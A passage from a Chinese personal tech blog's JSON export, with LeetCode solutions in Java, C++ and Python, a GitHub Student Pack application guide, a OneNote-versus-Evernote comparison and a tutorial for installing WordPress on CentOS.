findMedium(nums, L, i - 1, k) : findMedium(nums, i + 1, R, k - cnt); &#125; private int partition(int[] nums, int L, int R) &#123; int val = nums[L]; int i = L, j = R + 1; while (true) &#123; while (++i &lt; R &amp;&amp; nums[i] &lt; val) ; while (--j &gt; L &amp;&amp; nums[j] &gt; val) ; if (i &gt;= j) break; swap(nums, i, j); &#125; swap(nums, L, j); return j; &#125; private void swap(int[] nums, int i, int j) &#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125;&#125; 本文是leetcode 324 Wiggle Sort II 的题解，更多题解可见 https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Coin Change","slug":"leetcode-coin-change","date":"2015-12-27T02:31:00.000Z","updated":"2021-01-08T13:32:16.828Z","comments":true,"path":"leetcode-coin-change/","link":"","permalink":"https://www.hrwhisper.me/leetcode-coin-change/","excerpt":"leetcode Coin Change You are given coins of different denominations and a total amount of money amount. Write a function to compute the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1. Example 1: coins = [1, 2, 5], amount = 11 return 3 (11 = 5 + 5 + 1) Example 2: coins = [2], amount = 3 return -1. Note: You may assume that you have an infinite number of each kind of coin.","text":"leetcode Coin Change You are given coins of different denominations and a total amount of money amount. Write a function to compute the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1. Example 1: coins = [1, 2, 5], amount = 11 return 3 (11 = 5 + 5 + 1) Example 2: coins = [2], amount = 3 return -1. Note: You may assume that you have an infinite number of each kind of coin. 题目地址 ： leetcode Coin Change 题意： 零钱兑换，让你用最少的零钱数换取目标的数量。如有零钱1,2,5，换成11最少的为5+5+1 ，3个硬币 思路： dp，设dp[i] 为兑换目标i最少的硬币数。 则有：dp[i + coins[j] ] = min(dp[i + coins[j] ] , dp[i] + 1） 或者 dp[i] = min(dp[i - coins[j]] + 1,dp[i]) 说白了就是用当前的硬币能组合成啥，取最小。 第一个A此题=v= 水啊~ Code java 22ms 1234567891011121314public class Solution &#123; public int coinChange(int[] coins, int amount) &#123; int dp[] = new int[amount + 1]; final int INF = 0x7fffffff; for (int i = 1; i &lt;= amount; i++) dp[i] = INF; for (int i = 0; i &lt;= amount; i++) &#123; for (int j = 0; j &lt; coins.length; j++) &#123; if (coins[j] != INF &amp;&amp; i + coins[j] &lt;= amount &amp;&amp; dp[i]!= INF) dp[i + coins[j]] = Math.min(dp[i + coins[j]], dp[i] + 1); &#125; &#125; return dp[amount] == INF ? -1 : dp[amount]; &#125;&#125; C++ 120ms 123456789101112131415class Solution &#123;public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) &#123; const int INF = 0x7fffffff; vector&lt;int&gt; dp(amount + 1, INF); dp[0] = 0; for (int i = 0; i &lt;= amount; i++) &#123; for (int j = 0; j&lt;coins.size(); j++) &#123; if (coins[j] != INF &amp;&amp; i + coins[j] &lt;= amount &amp;&amp; dp[i] != INF &amp;&amp; dp[i + coins[j]] &gt; dp[i] + 1) dp[i + coins[j]] = dp[i] + 1; &#125; &#125; return dp[amount] == INF ? -1 : dp[amount]; &#125;&#125;; python 1234567891011121314class Solution(object): def coinChange(self, coins, amount): &quot;&quot;&quot; :type coins: List[int] :type amount: int :rtype: int &quot;&quot;&quot; INF = 0x7ffffffe dp = [0] + [INF] * amount for i in xrange(amount + 1): for coin in coins: if i + coin &lt;= amount: dp[i+coin] = min(dp[i+coin],dp[i] + 1) return dp[amount] if dp[amount] != INF else -1 方法二： 12345678910111213141516class Solution &#123;public: int coinChange(vector&lt;int&gt;&amp; coins, int amount) &#123; const int INF &#x3D; 0x7fffffff; vector&lt;int&gt; dp(amount + 1, INF); dp[0] &#x3D; 0; for (int i &#x3D; 0; i &lt;&#x3D; amount; i++) &#123; for (int coin:coins) &#123; if (i - coin &gt;&#x3D; 0 &amp;&amp; dp[i - coin] !&#x3D; INF &amp;&amp; dp[i - coin] + 1 &lt; dp[i]) &#123; dp[i] &#x3D; dp[i - coin] + 1; &#125; &#125; &#125; return dp[amount] &#x3D;&#x3D; INF ? -1 : dp[amount]; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"dynamic programming","slug":"dynamic-programming","permalink":"https://www.hrwhisper.me/tags/dynamic-programming/"}]},{"title":"Github student pack 申请","slug":"how-to-apply-for-github-student-pack","date":"2015-12-24T15:48:13.000Z","updated":"2020-10-19T14:35:48.742Z","comments":true,"path":"how-to-apply-for-github-student-pack/","link":"","permalink":"https://www.hrwhisper.me/how-to-apply-for-github-student-pack/","excerpt":"为什么要申请github student pack呢？ 因为身为学生，可以享受如下优惠 digitalocean vps 50$ (之前貌似是100 ,博主一年VPS不用钱了~) 5个github 私有仓库 等等 虽然是大四旺，但是，还是在校学生，申请个福利并不是干什么坏事~","text":"为什么要申请github student pack呢？ 因为身为学生，可以享受如下优惠 digitalocean vps 50$ (之前貌似是100 ,博主一年VPS不用钱了~) 5个github 私有仓库 等等 虽然是大四旺，但是，还是在校学生，申请个福利并不是干什么坏事~ 申请地址：https://education.github.com/ 申请说明 申请的表格如下： github-pack-appaly-form 邮箱申请方式 申请可以用edu邮箱，也可以上传学生相关的证明。 博主第一次的时候用ruc邮箱注册（之前在RUC交流的时候给的邮箱），马上被拒绝，然后申请了个小号，用了刚申请的fzu邮箱，也立刻被拒绝了。。。 而汤神拿着在NTU交换时候的邮箱，立马过了。。。 得出结论：国内邮箱基本不被接受，估计太多人拿去行骗。让真正的学生......哎 上传证件方式 博主接着上传了学生卡，就是校园一卡通，继续申请，又被拒绝了。。。估计是中文看不懂 第三次，博主把fzu的那个邮箱设为默认的。。但是验证的时候不是用FZU，而是选 I don't have school-issued email 然后上传 证明~（这样是人工验证的。。。不然EDU邮箱秒拒）。。。 博主上传了 英文成绩单+中英文在学证明（拍在一张照片），第一天下午申请，第二天早上就给过了~ 需要注意： 名字和大学名和证明资料上的一致，用英文 github-pack-appaly-3-times 下面那一些how to use： My name is XXX , I am a FuZhou university student. The left of upload image is my transcript and the right is proof of student status. It is my third time to apply it . At the first time , I use my school-issued email address (xxxxxxxx@fzu.edu.cn) to apply it , but it got rejected at once. And the second time , I upload my school ID cards, It is written by Chinese ,so it got rejected too. This time I hope you can approve my application. Github is a good platform to restore source code. As we know, it is the largest host of source code in the world. I will use it to restore my codes, such as android apps, django project. It is based on git , so it is a good way to keep code under version control. I know, there are many amazing open source project on github, so I will fork some project which I am interesting to study. Thanks for you reading. 使用digitalocean优惠码 申请通过后，前往 https://education.github.com/pack 找到digitalocean，然后领取优惠码。 领完后登录digitalocean-右上角齿轮-settings-拉到最下面-输入你的优惠码 github-stuent-pack-digitalocean-use-to-form 结果是立马50\\(就到账啦~~(以前是100\\)，不会是看我大四的给我减半吧？应该不会) github-stuent-pack-digitalocean-use-to-get-50-dollars ^ ^ 如果你使用点击该链接digitalocean注册个账号，可以领到10\\(, 然后再用github优惠码，这样就是60\\)啦！！！ (当然，你领到$10后，再填student会说你不是新用户，这个时候直接提交服务，和管理员说明，即可) 后记 抓住大四的尾巴~ 博主一年VPS不用愁啦，哈哈~","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"}]},{"title":"leetcode Create Maximum Number","slug":"leetcode-create-maximum-number","date":"2015-12-23T15:19:57.000Z","updated":"2021-01-08T13:32:16.836Z","comments":true,"path":"leetcode-create-maximum-number/","link":"","permalink":"https://www.hrwhisper.me/leetcode-create-maximum-number/","excerpt":"leetcode Create Maximum Number Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k &lt;= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity. Example 1: nums1 = [3, 4, 6, 5] nums2 = [9, 1, 2, 5, 8, 3] k = 5 return [9, 8, 6, 5, 3] Example 2: nums1 = [6, 7] nums2 = [6, 0, 4] k = 5 return [6, 7, 6, 0, 4] Example 3: nums1 = [3, 9] nums2 = [8, 9] k = 3 return [9, 8, 9]","text":"leetcode Create Maximum Number Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k &lt;= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity. Example 1: nums1 = [3, 4, 6, 5] nums2 = [9, 1, 2, 5, 8, 3] k = 5 return [9, 8, 6, 5, 3] Example 2: nums1 = [6, 7] nums2 = [6, 0, 4] k = 5 return [6, 7, 6, 0, 4] Example 3: nums1 = [3, 9] nums2 = [8, 9] k = 3 return [9, 8, 9] 题目地址：leetcode Create Maximum Number 题意： 给定两个长度为m和n的数组，他们由0~9的数组组成，现在，让你通过这两个数组中的数字组建一个长度为k 的数组（k&lt;=m+n) ,原来数组的相对顺序要保留。 思路： 递归写法TLE了。 问了一下CJL的思路~其实都差不多。我是直接原串找当前符合条件的最大的值，然后递归，他是枚举长度，然后找符合长度的。。。 第7个AC哈哈 我A这题的时候。。。这题一共 7个AC，410+次提交。。。通过率1%... 难度medium，现在改成hard了。。。 枚举第一个数组A的个数i，那么数组B的个数就确定了 k -i。 然后枚举出A和B长度分别为i和k-i的最大子数组，（可以用栈，类似leetcode Remove Duplicate Letters） 最后组合看看哪个大。 组合的过程类似合并排序，看看哪个数组大，就选哪个。 枚举数组长度复杂度O(k)，找出最大子数组O(n)，合并的话O(k^2) 而k最坏是m+n,所以总的复杂度就是O((m+n)^3) Idea: To find the maximum ,we can enumerate how digits we should get from nums1 , we suppose it is i. So , the digits from nums2 is K - i. And we can use a stack to get the get maximum number(x digits) from one array.（just like leetcode Remove Duplicate Letters） OK, Once we choose two maximum subarray , we should combine it to the answer. It is just like merger sort, but we should pay attention to the case: the two digital are equal. we should find the digits behind it to judge which digital we should choose now. In other words,we should judge which subarry is bigger than the other. That's all. The algorithm is O((m+n)^3) in the worst case. If you have any question or suggest, I am happy you can comment on my blog . Thanks, merry christmas :) Solution Java 21ms 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * Created by hrwhisper on 2015/11/23. * https://www.hrwhisper.me/leetcode-create-maximum-number/ */public class Solution &#123; public int[] maxNumber(int[] nums1, int[] nums2, int k) &#123; int[] ans = new int[k]; for (int i = Math.max(k - nums2.length, 0); i &lt;= Math.min(nums1.length, k); i++) &#123; int[] res1 = get_max_sub_array(nums1, i); int[] res2 = get_max_sub_array(nums2, k - i); int[] res = new int[k]; int pos1 = 0, pos2 = 0, tpos = 0; while (pos1 &lt; res1.length pos2 &lt; res2.length) &#123; res[tpos++] = greater(res1, pos1, res2, pos2) ? res1[pos1++] : res2[pos2++]; &#125; if (!greater(ans, 0, res, 0)) ans = res; &#125; return ans; &#125; public boolean greater(int[] nums1, int start1, int[] nums2, int start2) &#123; for (; start1 &lt; nums1.length &amp;&amp; start2 &lt; nums2.length; start1++, start2++) &#123; if (nums1[start1] &gt; nums2[start2]) return true; if (nums1[start1] &lt; nums2[start2]) return false; &#125; return start1 != nums1.length; &#125; public int[] get_max_sub_array(int[] nums, int k) &#123; int[] res = new int[k]; int len = 0; for (int i = 0; i &lt; nums.length; i++) &#123; while (len &gt; 0 &amp;&amp; len + nums.length - i &gt; k &amp;&amp; res[len - 1] &lt; nums[i]) &#123; len--; &#125; if (len &lt; k) res[len++] = nums[i]; &#125; return res; &#125;&#125; C++ 60ms 1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123;public: vector&lt;int&gt; maxNumber(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2, int k) &#123; vector&lt;int&gt; ans(k, 0); for (int i = max(0, k - (int)nums2.size()); i &lt;= min(k, (int)nums1.size()); i++) &#123; vector&lt;int&gt; res1 = get_max_sub_array(nums1, i); vector&lt;int&gt; res2 = get_max_sub_array(nums2, k - i); vector&lt;int&gt; res(k, 0); int pos1 = 0, pos2 = 0, tpos = 0; while (pos1 &lt; res1.size() || pos2 &lt; res2.size()) &#123; res[tpos++] = greater(res1, pos1, res2, pos2) ? res1[pos1++] : res2[pos2++]; &#125; if (!greater(ans, 0, res, 0)) ans = res; &#125; return ans; &#125; bool greater(const vector&lt;int&gt; &amp; a, int start1, const vector&lt;int&gt; &amp;b, int start2) &#123; for (; start1 &lt; a.size() &amp;&amp; start2 &lt; b.size(); start1++, start2++) &#123; if (a[start1] &gt; b[start2]) return true; if (a[start1] &lt; b[start2]) return false; &#125; return start1 != a.size(); &#125; vector&lt;int&gt; get_max_sub_array(const vector&lt;int&gt; &amp;nums, const int&amp; k) &#123; vector&lt;int&gt; res(k,0); int len = 0 , n = nums.size(); for (int i = 0; i &lt; n; i++) &#123; while (len &amp;&amp; len + n - i &gt; k &amp;&amp; nums[i] &gt; res[len - 1]) len--; if (len &lt; k) res[len++] = nums[i]; &#125; return res; &#125;&#125;; Python 636ms 123456789101112131415161718192021222324class Solution(object): def maxNumber(self, nums1, nums2, k): &quot;&quot;&quot; :type nums1: List[int] :type nums2: List[int] :type k: int :rtype: List[int] &quot;&quot;&quot; def get_max_sub_array(nums, k): res , n = [] ,len(nums) for i in xrange(n): while res and len(res) + n - i &gt; k and nums[i] &gt; res[-1]: res.pop() if len(res) &lt; k: res.append(nums[i]) return res ans = [0] * k for i in xrange(max(0, k - len(nums2)), min(k, len(nums1)) + 1): res1 = get_max_sub_array(nums1, i) res2 = get_max_sub_array(nums2, k - i) ans = max(ans, [max(res1, res2).pop(0) for _ in xrange(k)]) return ans 只需要greater函数的解释 为什么只需要比较两个子序列大小呢？ 来看看我写的比较早的版本，主要注意合并的时候。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * Created by hrwhisper on 2015/11/23. * https://www.hrwhisper.me/leetcode-create-maximum-number/ */public class Solution &#123; public int[] maxNumber(int[] nums1, int[] nums2, int k) &#123; int get_from_nums1 = Math.min(nums1.length, k); int[] ans = new int[k]; for (int i = Math.max(k - nums2.length, 0); i &lt;= get_from_nums1; i++) &#123; int[] res1 = new int[i]; if (i &gt; 0) res1 = solve(nums1, i); int[] res2 = new int[k - i]; if (k - i &gt; 0) res2 = solve(nums2, k - i); int pos1 = 0, pos2 = 0, tpos = 0; int[] res = new int[k]; while (res1.length &gt; 0 &amp;&amp; res2.length &gt; 0 &amp;&amp; pos1 &lt; res1.length &amp;&amp; pos2 &lt; res2.length) &#123; if (res1[pos1] &gt; res2[pos2]) res[tpos++] = res1[pos1++]; else if (res1[pos1] &lt; res2[pos2]) res[tpos++] = res2[pos2++]; else &#123; int x = pos1; int y = pos2; while (x &lt; res1.length &amp;&amp; y &lt; res2.length &amp;&amp; res1[x] == res2[y]) &#123; x++; y++; &#125; if (x &lt; res1.length &amp;&amp; y &lt; res2.length) &#123; if (res1[x] &lt; res2[y]) &#123; res[tpos++] = res2[pos2++]; &#125; else &#123; res[tpos++] = res1[pos1++]; &#125; &#125; else if (x &lt; res1.length) &#123; res[tpos++] = res1[pos1++]; &#125; else &#123; res[tpos++] = res2[pos2++]; &#125; &#125; &#125; while (pos1 &lt; res1.length) res[tpos++] = res1[pos1++]; while (pos2 &lt; res2.length) res[tpos++] = res2[pos2++]; if (updateAns(ans, res)) ans = res; &#125; return ans; &#125; public boolean updateAns(int[] ans, int[] res) &#123; for (int i = 0; i &lt; ans.length; i++) &#123; if (ans[i] &gt; res[i]) return false; if (ans[i] &lt; res[i]) return true; &#125; return false; &#125; public int[] solve(int[] nums, int k) &#123; int[] res = new int[k]; int len = 0; for (int i = 0; i &lt; nums.length; i++) &#123; while (len &gt; 0 &amp;&amp; len + nums.length - i &gt; k &amp;&amp; res[len - 1] &lt; nums[i]) &#123; len--; &#125; if (len &lt; k) res[len++] = nums[i]; &#125; return res; &#125;&#125; 最大子数组 res1 用x来遍历，res2用y来遍历。 对于相等的情况，往后找直到其中一个比另一个大，或者一个到了数组的长度 对于都未到达数组长度的，哪个大选哪个 若x1 &lt; res1.length ，说明x2到达数组的长度了，选res1 ，因为要给后面的数更早出现的机会 [3,3,4] [3,3] k = 5 答案为[3,3,4,3,3] 选择的过程中，因为第二个到末尾了，第一个还没到，显然4比较大，要给4早出现的机会。所以选res1 否则选res2（可能是x2 &lt; res2.length 也可能是 x1 == res1.length &amp;&amp; x2 == res2.length） 根据上面的，只要比较res1比res2未选的部分哪个大就选哪个即可。 所以，简写为： 123while (pos1 &lt; res1.length pos2 &lt; res2.length) &#123; res[tpos++] = greater(res1, pos1, res2, pos2) ? res1[pos1++] : res2[pos2++];&#125; 至于greater函数，可以和updateAns函数合并成如下： 1234567public boolean greater(int[] nums1, int start1, int[] nums2, int start2) &#123; for (; start1 &lt; nums1.length &amp;&amp; start2 &lt; nums2.length; start1++, start2++) &#123; if (nums1[start1] &gt; nums2[start2]) return true; if (nums1[start1] &lt; nums2[start2]) return false; &#125; return start1 != nums1.length; &#125; 递归寻找最大子数组 java 150ms,递归寻找效率肯定不如用栈 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687public class Solution &#123; public int[] maxNumber(int[] nums1, int[] nums2, int k) &#123; int get_from_nums1 = Math.min(nums1.length, k); int[] ans = new int[k]; for (int i = Math.max(k - nums2.length, 0); i &lt;= get_from_nums1; i++) &#123; int[] res1 = new int[i]; if (i &gt; 0) res1 = solve(nums1, 0, res1, 0, i); int[] res2 = new int[k - i]; if (k - i &gt; 0) res2 = solve(nums2, 0, res2, 0, k - i); int pos1 = 0, pos2 = 0, tpos = 0; int[] res = new int[k]; while (res1.length &gt; 0 &amp;&amp; res2.length &gt; 0 &amp;&amp; pos1 &lt; res1.length &amp;&amp; pos2 &lt; res2.length) &#123; if (res1[pos1] &gt; res2[pos2]) res[tpos++] = res1[pos1++]; else if (res1[pos1] &lt; res2[pos2]) res[tpos++] = res2[pos2++]; else &#123; int x = pos1; int y = pos2; while (x &lt; res1.length &amp;&amp; y &lt; res2.length &amp;&amp; res1[x] == res2[y]) &#123; x++; y++; &#125; if (x &lt; res1.length &amp;&amp; y &lt; res2.length) &#123; if (res1[x] &lt; res2[y]) &#123; res[tpos++] = res2[pos2++]; &#125; else &#123; res[tpos++] = res1[pos1++]; &#125; &#125; else if (x &lt; res1.length) &#123; res[tpos++] = res1[pos1++]; &#125; else &#123; res[tpos++] = res2[pos2++]; &#125; &#125; &#125; while (pos1 &lt; res1.length) res[tpos++] = res1[pos1++]; while (pos2 &lt; res2.length) res[tpos++] = res2[pos2++]; if (updateAns(ans, res)) ans = res; &#125; return ans; &#125; public boolean updateAns(int[] ans, int[] res) &#123; for (int i = 0; i &lt; ans.length; i++) &#123; if (ans[i] &gt; res[i]) return false; if(ans[i] &lt; res[i]) return true; &#125; return true; &#125; public int[] solve(int[] nums1, int start, int[] res, int cur, int k) &#123; if (cur == k) return res; int[] dig_num1 = new int[10]; for (int i = 0; i &lt; 10; i++) dig_num1[i] = -1; for (int i = start; i &lt; nums1.length; i++) &#123; if (dig_num1[nums1[i]] == -1) &#123; dig_num1[nums1[i]] = i; &#125; &#125; int pos1 = -1; for (int i = 0; i &lt; 10; i++) &#123; if (dig_num1[i] &gt;= 0) pos1 = i; &#125; if (pos1 &gt;= 0 &amp;&amp; nums1.length - dig_num1[pos1] + cur &lt; k) &#123; pos1--; while (pos1 &gt; 0 &amp;&amp; (dig_num1[pos1] == -1 nums1.length - dig_num1[pos1] + cur &lt; k)) pos1--; &#125; if (pos1 &lt; 0) return res; res[cur] = pos1; return solve(nums1, dig_num1[pos1] + 1, res, cur + 1, k); &#125;&#125;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"onenote 比 evernote 好用的4大理由","slug":"4-reasons-for-onenote-better-than-evernote","date":"2015-12-22T13:40:40.000Z","updated":"2021-01-08T13:42:14.023Z","comments":true,"path":"4-reasons-for-onenote-better-than-evernote/","link":"","permalink":"https://www.hrwhisper.me/4-reasons-for-onenote-better-than-evernote/","excerpt":"用了许久的onenote,现在博主正在把evernote迁移到onenote上。 了解了onenote的好处，就越发觉得这两个不是一个级别的东西.....","text":"用了许久的onenote,现在博主正在把evernote迁移到onenote上。 了解了onenote的好处，就越发觉得这两个不是一个级别的东西..... 更舒爽的阅读体验 下面是evernote和onenote的对比 evernote已经尽力的排版了，而onenote轻松就可以达到右图效果。而排版的差别带来的阅读感受是差别很大的。 折叠 如图，不需要的东西直接折叠起来，只看自己当前要看的内容。支持按标题1,2,…..标题6折叠，层次分明。 onenote-fold-title 缩放 onenote支持ctrl+鼠标滚轮缩放,可自由调整比例，可大可小。 移动适配 博主看了看手头上的lumia 1020，身为windows 10 mobile的用户，首推onenote。evernote做得和啥似的。 多么漂亮的体验显示~ 其实你按ctrl + alt +D 同样的会发现可以自动适应大小。 除非： 图片尺寸你拉太大 当前输入的位置上右边还有一栏笔记 更方便的写作方式 随处可以记录笔记 就像一个个文本框一样，随便放置 onenote-write-anything-to-anywhere 快捷键 为什么markdown用起来那么舒服简单的语法，就可以排版好，onenote可以用快捷键来实现！（虽然比markdown复杂一点）一个ctrl + alt + 1 就是 一级标题 ctrl + B 加粗字体 等等 格式刷 有这玩意，排版方便极了。类似的格式，轻轻的ctrl + shift + v粘贴一下格式~舒服 手写笔记 有人为了onenote买了surface 我会乱说？ 有了触控笔，爱涂鸦就涂鸦，爱写就写~ 公式 onenote的编辑器强大，可以自由的编辑和插入公式。 笔记互相链接 比如，我在笔记本A里想引用笔记B里面的，ctrl + k无压力好么！ onenote-page-connect-to-other-page 识别图片中的文字 什么，PDF是扫描版，你复制不下来，在辛苦的码字？ 截个图，粘贴到onenoe, 对着图片，右键-复制图片中的文本。 ctrl + v 一切搞定 你会觉得摘抄图片上的笔记从此不再烦恼~ 自动记录来源地址 如果你使用靠边功能，并且记录的是office的话，会自动记录下这个文件的地址。鼠标移动到地址上还会给出预览图！！！ （你可以看到使用靠边停靠而且还自动适应了宽度。） 如果是网页上的话，会自动记录来源的URL以后你想看看来源地址，是不是很方便吖 模板 onenote也是有模板的！！！你怕不怕。 在插入-页面模板里 页下分页 层次分明: onenote-paging 笔记后悔药 这里说的不是误删除，误删除evernote放在回收站里，onenote在笔记本回收站里。 我说的是你之前编辑的版本！！！ 软件都有版本控制神器git ，onenote也有！在页面右键显示页面版本！ 或者上方的工具栏中历史纪录 隐私保证 分区-右键-使用密码保护此分区，再也不用担心被人偷看日志了。 需要注意的是密码忘记了貌似是找不回来的。。。。","categories":[{"name":"生产力","slug":"生产力","permalink":"https://www.hrwhisper.me/categories/%E7%94%9F%E4%BA%A7%E5%8A%9B/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"windows10","slug":"windows10","permalink":"https://www.hrwhisper.me/tags/windows10/"},{"name":"windwos10 mobile","slug":"windwos10-mobile","permalink":"https://www.hrwhisper.me/tags/windwos10-mobile/"}]},{"title":"digitalocean 下 centos 搭建 wordpress过程","slug":"installing-wordpress-on-centos","date":"2015-12-20T15:06:16.000Z","updated":"2021-01-08T13:42:14.095Z","comments":true,"path":"installing-wordpress-on-centos/","link":"","permalink":"https://www.hrwhisper.me/installing-wordpress-on-centos/","excerpt":"博主昨天把blog迁移到digitalocean啦~特地来个傻瓜式配置教程。 本文包括如下内容 centos下安装wordpress过程 开启mod_rewrite模块 开启GZIP压缩网页 上传图片/文件失败解决办法 YOAST SEO sitemap 404 解决办法","text":"博主昨天把blog迁移到digitalocean啦~特地来个傻瓜式配置教程。 本文包括如下内容 centos下安装wordpress过程 开启mod_rewrite模块 开启GZIP压缩网页 上传图片/文件失败解决办法 YOAST SEO sitemap 404 解决办法 主机配置 centos 6.7 *32 5$ /m ps: 点击该链接注册可以获得10$ : digitalocean 新加坡结点 等一会儿就好了: digitalocean-create-img-finished happy coding ^ ^ 工具准备 使用windwos的童鞋需要准备如下工具之一，因为要用命令行的方式来操作服务器。为此，需要一个能支持SSH登录的软件。 Xshell : SSH登录，推荐这个，界面漂亮。 Xftp: SFTP传文件工具，和Xshell师出同门，推荐 SSH Secure Shell Client 这个也有SSH 登录的功能，但对中文乱码。 它还有可视化的界面来传文件，类似FTP putty：很简洁的一个ssh工具 获取需要资源 打开你的SSH登录软件，连接到digitalocean上，（用户密码还有IP地址你建好一个服务器会发到你的邮箱:) ）第一次进去要求修改密码。 修改完后，依次输入如下命令，获取资源，设置开机启动，启动服务 yum -y install mysql-server httpd php php-mysql unzip wget chkconfig httpd on chkconfig mysqld on /etc/init.d/mysqld start /etc/init.d/httpd start mysql 设置 登录mysql mysql -u root -p 创建root密码 这一步主要是为了安全起见~mysql默认root密码为空，这不安全 SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newpass'); 创建数据库 create database wordpress; 创建用户（把hrwhisper改成你的用户即可） create user hrwhisper@localhost; 设置密码 set password for hrwhisper@localhost=password(\"123456\"); 设置权限（需要给这个新用户权限访问数据库） grant all privileges on wordpress.* to hrwhisper@localhost identified by '123456'; 做完上面的步骤后 FLUSH PRIVILEGES; exit; wordpress获取和配置 获取 获取第一步我们已经yum 安装了 wget所以只要执行下面的命令就可以，这里假定当前终端目录为(当前用户的根目录) wget http://wordpress.org/latest.tar.gz 解压 tar -xzvf latest.tar.gz 配置wordpress 创建wp-config.php文件 cp ~/wordpress/wp-config-sample.php ~/wordpress/wp-config.php 编辑（如果没有vim那么yum install vim下） vim ~/wordpress/wp-config.php 这里简单介绍下vim使用： vim 用方向键控制u 撤销，i插入模式 保存esc然后输入:wq即可 edit-wordpress-database-info 以博主刚才的为例： DB_NAME : wordpress DB_USER: hrwhisper DB_PASSWORD:123456 接下来 复制到 web 目录下 mkdir -p /var/www/html （如果文件夹不存在） cp -r ~/wordpress/* /var/www/html 用浏览器访问试试 导入数据库 如果不是新站，而是原来的站点呢？那么需要进行数据库的导入。 将数据库上传到服务器。(博主用Xftp 协议用SFTP，不要用ftp，SFTP安全 ) 登录数据库后，进行如下操作 选择数据库 mysql&gt;use abc; 设置数据库编码 mysql&gt;set names utf8; 导入数据（注意sql文件的路径） mysql&gt;source /home/abc/abc.sql; 下面介绍博主配置好后使用中出现的问题和解决办法 开启mod_rewrite 如果你更改了wordpress固定链接，那么mod_rewrite是要开启的~不然就一片404啦 vim /etc/httpd/conf/httpd.conf AllowOverride None 改为 AllowOverride All （在 &lt;Directory \"/var/www/html\"&gt;里） 在/var/www/html/ 里编写.htaccess文件 重起服务器，终端中输入 service httpd restart 博主这里是338行 apache-mod_rewrite-open 参考： http://dev.antoinesolutions.com/apache-server/mod_rewrite 开启GZIP压缩网页 有两种方法，mod_gzip 和mod_deflate，用一个即可。 mod_gzip 和mod_deflate的主要区别 第一个区别是安装它们的Apache Web服务器版本的差异。Apache 1.x系列没有内建网页压缩技术，所以才去用额外的第三方mod_gzip 模块来执行压缩。而Apache 2.x官方在开发的时候，就把网页压缩考虑进去，内建了mod_deflate 这个模块，用以取代mod_gzip。虽然两者都是使用的Gzip压缩算法，它们的运作原理是类似的。 第二个区别是压缩质量。mod_deflate 压缩速度略快而mod_gzip 的压缩比略高。一般默认情况下，mod_gzip 会比mod_deflate 多出4%~6％的压缩量。 第三个区别是对服务器资源的占用。 一般来说mod_gzip 对服务器CPU的占用要高一些。mod_deflate 是专门为确保服务器的性能而使用的一个压缩模块，mod_deflate 需要较少的资源来压缩文件。这意味着在高流量的服务器，使用mod_deflate 可能会比mod_gzip 加载速度更快。 mod_deflate 推荐这种方法，把下面的内容写在 .htaccess中即可 1234567891011121314AddOutputFilterByType DEFLATE text&#x2F;plainAddOutputFilterByType DEFLATE text&#x2F;htmlAddOutputFilterByType DEFLATE text&#x2F;phpAddOutputFilterByType DEFLATE text&#x2F;xmlAddOutputFilterByType DEFLATE text&#x2F;cssAddOutputFilterByType DEFLATE text&#x2F;javascriptAddOutputFilterByType DEFLATE application&#x2F;xhtml+xmlAddOutputFilterByType DEFLATE application&#x2F;xmlAddOutputFilterByType DEFLATE application&#x2F;rss+xmlAddOutputFilterByType DEFLATE application&#x2F;atom_xmlAddOutputFilterByType DEFLATE application&#x2F;x-javascriptAddOutputFilterByType DEFLATE application&#x2F;x-httpd-phpAddOutputFilterByType DEFLATE image&#x2F;svg+xmlAddOutputFilterByType DEFLATE image&#x2F;gif image&#x2F;png image&#x2F;jpe image&#x2F;swf image&#x2F;jpeg 